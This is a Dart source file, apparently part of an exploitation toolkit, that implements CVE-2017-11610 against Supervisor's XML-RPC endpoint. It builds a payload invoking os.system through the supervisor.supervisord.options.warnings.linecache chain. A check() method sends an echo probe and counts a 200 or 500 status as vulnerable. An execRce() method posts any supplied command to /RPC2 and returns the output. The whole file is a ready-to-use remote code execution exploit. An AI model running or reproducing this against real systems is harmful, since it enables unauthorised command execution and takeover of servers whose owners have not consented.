import 'exp_result.dart';
import '../../../core/http/http_client.dart';

class SupervisorExpService {
  final String baseUrl;
  final Duration timeout;

  SupervisorExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  String _xmlPayload(String cmd) => '''<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param><string><![CDATA[$cmd]]></string></param>
</params>
</methodCall>''';

  Future<ExpResult> check() async {
    try {
      final res = await _httpClient.post(
        '$_base/RPC2',
        headers: {'Content-Type': 'text/xml'},
        body: _xmlPayload('echo supervisord_54289'),
      );
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(
          true,
          'CVE-2017-11610',
          'Supervisor XML-RPC 端点可访问 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-11610', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await _httpClient.post(
        '$_base/RPC2',
        headers: {'Content-Type': 'text/xml'},
        body: _xmlPayload(cmd),
      );
      final body = res.body ?? '';
      return body.isNotEmpty ? body : null;
    } catch (_) {
      return null;
    }
  }
}
